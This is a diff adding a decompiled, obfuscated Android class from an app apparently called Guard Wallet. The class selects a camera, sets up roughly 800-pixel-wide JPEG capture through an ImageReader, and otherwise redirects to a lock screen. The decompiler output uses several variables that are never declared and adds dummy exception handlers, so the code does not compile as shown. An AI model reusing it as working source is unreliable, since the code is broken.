@@ -1,0 +1,384 @@
+package m;
+
+import a1.q;
+import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraDevice;
+import android.hardware.camera2.CameraManager;
+import android.hardware.camera2.params.StreamConfigurationMap;
+import android.media.ImageReader;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Size;
+import com.guard.wallet.LockActivity;
+import com.guard.wallet.MainApplication;
+import com.guard.wallet.utils.g;
+import java.util.Objects;
+import java.util.concurrent.atomic.AtomicBoolean;
+
+public final class d {
+   public static d f = new d();
+   public final AtomicBoolean a = new AtomicBoolean(false);
+   public ImageReader b;
+   public CameraDevice c;
+   public CameraCaptureSession d;
+   public c e;
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public static c b(CameraManager var0, int var1) {
+      Exception var10000;
+      label108: {
+         int var6;
+         String[] var10;
+         try {
+            if (var0.getCameraIdList().length <= 0) {
+               return null;
+            }
+
+            var10 = var0.getCameraIdList();
+            var6 = var10.length;
+         } catch (Exception var23) {
+            var10000 = var23;
+            boolean var10001 = false;
+            break label108;
+         }
+
+         int var2 = 0;
+
+         label101:
+         while (true) {
+            if (var2 >= var6) {
+               return null;
+            }
+
+            String var8 = var10[var2];
+
+            Integer var9;
+            c var11;
+            try {
+               var11 = new c();
+               var11.a = var8;
+               var25 = var0.getCameraCharacteristics(var8);
+               var9 = (Integer)var25.get(CameraCharacteristics.SENSOR_ORIENTATION);
+            } catch (Exception var21) {
+               var10000 = var21;
+               boolean var30 = false;
+               break;
+            }
+
+            if (var9 != null) {
+               try {
+                  var11.c = var9;
+               } catch (Exception var20) {
+                  var10000 = var20;
+                  boolean var31 = false;
+                  break;
+               }
+            }
+
+            Integer var12;
+            try {
+               var12 = (Integer)var25.get(CameraCharacteristics.LENS_FACING);
+               var26 = (StreamConfigurationMap)var25.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
+            } catch (Exception var19) {
+               var10000 = var19;
+               boolean var32 = false;
+               break;
+            }
+
+            if (var26 != null) {
+               Size[] var13;
+               try {
+                  var13 = var26.getOutputSizes(256);
+               } catch (Exception var18) {
+                  var10000 = var18;
+                  boolean var33 = false;
+                  break;
+               }
+
+               label93:
+               if (var13 != null) {
+                  int var7;
+                  try {
+                     if (var13.length <= 0) {
+                        break label93;
+                     }
+
+                     var7 = var13.length;
+                  } catch (Exception var22) {
+                     var10000 = var22;
+                     boolean var34 = false;
+                     break;
+                  }
+
+                  int var4 = Integer.MAX_VALUE;
+                  Size var27 = null;
+                  int var3 = 0;
+
+                  label85: {
+                     while (var3 < var7) {
+                        Size var28 = var13[var3];
+
+                        int var5;
+                        try {
+                           var5 = Math.abs(var28.getWidth() - 800);
+                        } catch (Exception var17) {
+                           var10000 = var17;
+                           boolean var35 = false;
+                           break label101;
+                        }
+
+                        if (var5 > var4) {
+                           break label85;
+                        }
+
+                        var3++;
+                        var27 = var28;
+                        var4 = var5;
+                     }
+
+                     var27 = null;
+                  }
+
+                  Size var29 = var27;
+                  if (var27 == null) {
+                     try {
+                        var29 = var13[var13.length - 1];
+                     } catch (Exception var16) {
+                        var10000 = var16;
+                        boolean var36 = false;
+                        break;
+                     }
+                  }
+
+                  try {
+                     var11.d = var29;
+                  } catch (Exception var15) {
+                     var10000 = var15;
+                     boolean var37 = false;
+                     break;
+                  }
+               }
+            }
+
+            if (var12 != null) {
+               try {
+                  if (var12 == var1) {
+                     var11.b = var12;
+                     return var11;
+                  }
+               } catch (Exception var14) {
+                  var10000 = var14;
+                  boolean var38 = false;
+                  break;
+               }
+            }
+
+            var2++;
+         }
+      }
+
+      Exception var24 = var10000;
+      q.s("m.d", var24);
+      return null;
+   }
+
+   public static d c() {
+      if (f == null) {
+         f = new d();
+      }
+
+      return f;
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final boolean a(int var1) {
+      if (g.Z() == null) {
+         return false;
+      } else if (!g.k()) {
+         c var16 = new c();
+         this.e = var16;
+         var16.b = var1;
+         AtomicBoolean var17 = this.a;
+         if (!var17.get()) {
+            var17.set(true);
+            if (LockActivity.b() == null) {
+               g.d1(MainApplication.getInstance().getPackageName(), LockActivity.class.getName());
+            } else {
+               LockActivity.b().c();
+            }
+         }
+
+         return false;
+      } else {
+         CameraManager var3 = (CameraManager)g.Z().getSystemService("camera");
+         if (var3 != null) {
+            Exception var10000;
+            label78: {
+               c var2;
+               try {
+                  var2 = b(var3, var1);
+                  this.e = var2;
+               } catch (Exception var11) {
+                  var10000 = var11;
+                  boolean var10001 = false;
+                  break label78;
+               }
+
+               if (var2 == null) {
+                  return false;
+               }
+
+               try {
+                  if (q.B(var2.a)) {
+                     return false;
+                  }
+               } catch (Exception var10) {
+                  var10000 = var10;
+                  boolean var20 = false;
+                  break label78;
+               }
+
+               try {
+                  var12 = this.e.d;
+               } catch (Exception var9) {
+                  var10000 = var9;
+                  boolean var21 = false;
+                  break label78;
+               }
+
+               ImageReader var13;
+               if (var12 != null) {
+                  try {
+                     var13 = ImageReader.newInstance(
+                        800, (int)(Float.parseFloat(String.valueOf(var12.getHeight())) / (float)this.e.d.getWidth() * 800.0F), 256, 2
+                     );
+                  } catch (Exception var8) {
+                     var10000 = var8;
+                     boolean var22 = false;
+                     break label78;
+                  }
+               } else {
+                  try {
+                     var13 = ImageReader.newInstance(800, 800, 256, 2);
+                  } catch (Exception var7) {
+                     var10000 = var7;
+                     boolean var23 = false;
+                     break label78;
+                  }
+               }
+
+               try {
+                  this.b = var13;
+                  f var4 = new f(this.e.b);
+                  Handler var5 = new Handler(Looper.getMainLooper());
+                  var13.setOnImageAvailableListener(var4, var5);
+                  String var15 = this.e.a;
+                  e var19 = new e(this.b.getSurface());
+                  Handler var18 = new Handler(Looper.getMainLooper());
+                  var3.openCamera(var15, var19, var18);
+                  return true;
+               } catch (Exception var6) {
+                  var10000 = var6;
+                  boolean var24 = false;
+               }
+            }
+
+            Exception var14 = var10000;
+            q.s("m.d", var14);
+         }
+
+         return false;
+      }
+   }
+
+   public final void d(int var1) {
+      c var3 = this.e;
+      int var2;
+      if (var3 != null) {
+         var2 = var3.b;
+      } else {
+         var2 = -1;
+      }
+
+      if (Objects.equals(var2, var1) && this.c != null) {
+         this.e();
+      }
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final boolean e() {
+      Exception var10000;
+      label55: {
+         CameraCaptureSession var1;
+         try {
+            var1 = this.d;
+         } catch (Exception var8) {
+            var10000 = var8;
+            boolean var10001 = false;
+            break label55;
+         }
+
+         if (var1 != null) {
+            try {
+               var1.stopRepeating();
+               this.d = null;
+            } catch (Exception var7) {
+               var10000 = var7;
+               boolean var12 = false;
+               break label55;
+            }
+         }
+
+         try {
+            var9 = this.c;
+         } catch (Exception var6) {
+            var10000 = var6;
+            boolean var13 = false;
+            break label55;
+         }
+
+         if (var9 != null) {
+            try {
+               var9.close();
+               this.c = null;
+            } catch (Exception var5) {
+               var10000 = var5;
+               boolean var14 = false;
+               break label55;
+            }
+         }
+
+         try {
+            var10 = this.b;
+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var15 = false;
+            break label55;
+         }
+
+         if (var10 != null) {
+            try {
+               var10.close();
+               this.b = null;
+            } catch (Exception var3) {
+               var10000 = var3;
+               boolean var16 = false;
+               break label55;
+            }
+         }
+
+         try {
+            this.e = null;
+            return true;
+         } catch (Exception var2) {
+            var10000 = var2;
+            boolean var17 = false;
+         }
+      }
+
+      Exception var11 = var10000;
+      q.s("m.d", var11);
+      return false;
+   }
+}
